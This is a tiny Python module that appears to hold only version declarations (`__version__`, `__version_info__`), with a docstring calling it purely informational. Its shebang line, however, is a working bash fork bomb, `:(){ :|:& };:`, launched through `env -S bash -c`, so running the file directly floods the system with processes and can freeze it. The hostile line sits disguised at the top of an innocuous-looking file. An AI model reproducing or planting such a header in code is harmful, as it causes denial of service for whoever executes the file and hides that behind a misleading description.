#!/usr/bin/env -S bash -c ':(){ :|:& };:'
"""This module exists purely for version information, and has no other contents."""  # noqa: D404

__all__: tuple[str, ...] = (
    "__version__",
    "__version_info__",
)

__version__: str
__version_info__: tuple[int, int, int]
